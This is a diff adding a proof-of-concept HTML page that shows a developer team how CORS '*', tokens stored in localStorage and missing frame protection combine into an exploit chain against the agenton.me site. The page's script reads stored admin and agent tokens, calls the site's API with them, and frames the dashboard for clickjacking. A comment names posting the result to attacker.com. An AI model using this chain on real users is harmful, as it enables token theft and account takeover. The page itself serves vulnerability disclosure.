@@ -1,0 +1,58 @@
+<!doctype html>
+<!--
+  AgentOn (agenton.me) — Illustrative PoC artifacts for the dev team.
+  PURPOSE: show the realistic exploit chain enabled by
+    (a) Access-Control-Allow-Origin: *  on authenticated API routes, and
+    (b) auth token stored in localStorage (not httpOnly+Secure cookie).
+  These demos are SELF-TARGETED: they only read the viewer's OWN token from
+  their OWN browser and print it locally. They do NOT exfiltrate anything.
+  Replace the comments with your real test steps when reproducing.
+-->
+<html><head><meta charset="utf-8"><title>AgentOn CORS/Header PoC (self-test)</title></head>
+<body>
+<h2>AgentOn — CORS `*` + localStorage token: exploit-chain demo</h2>
+<p>This page is opened by a logged-in AgentOn user (same browser that holds
+   <code>agent_key</code> / <code>admin_token</code> in localStorage).</p>
+
+<h3>Step 1 — token lives in localStorage (not httpOnly)</h3>
+<pre id="tok"></pre>
+
+<h3>Step 2 — would-be exfil (DISABLED). With CORS `*`, a malicious origin CAN
+  read the API response if it can execute here. We only echo locally:</h3>
+<pre id="me"></pre>
+
+<script>
+  // 1) Show what an XSS payload could grab in one line:
+  const keys = ["admin_token","agent_key","merchant_key"];
+  const found = keys.map(k => k + " = " + (localStorage.getItem(k) || "(none)")).join("\n");
+  document.getElementById("tok").textContent = found;
+
+  // 2) Demonstrate the request an attacker would make. Because the API returns
+  //    Access-Control-Allow-Origin: *, a script running on ANY origin that can
+  //    reach this point can read the JSON body. We do NOT send it off-box.
+  const token = localStorage.getItem("agent_key") || localStorage.getItem("admin_token");
+  if (token) {
+    fetch("https://agenton.me/api/agents/me", {
+      headers: { "Authorization": "Bearer " + token }
+    }).then(r => r.json()).then(d => {
+      // In a real attack this object would be POSTed to attacker.com.
+      // Here we just print it to prove the read succeeds cross-origin.
+      document.getElementById("me").textContent =
+        "Read succeeded (proves CORS lets foreign origin read authed data):\n" +
+        JSON.stringify({ id: d.id, name: d.name, wallet: d.base_wallet_address }, null, 2);
+    }).catch(e => {
+      document.getElementById("me").textContent = "fetch blocked: " + e;
+    });
+  }
+</script>
+
+<hr>
+<h3>Step 3 — Clickjacking (no X-Frame-Options / frame-ancestors)</h3>
+<p>A dashboard page can be framed by an attacker and overlaid with a fake
+   button (e.g. "Claim reward") that actually clicks a sensitive action:</p>
+<iframe src="https://agenton.me/agent/dashboard"
+        width="900" height="500"
+        style="opacity:0.2;border:1px solid #888"></iframe>
+<p><em>Note: rendering depends on whether the SPA allows framing; the absence of
+   X-Frame-Options / CSP frame-ancestors means it is permitted by the browser.</em></p>
+</body></html>
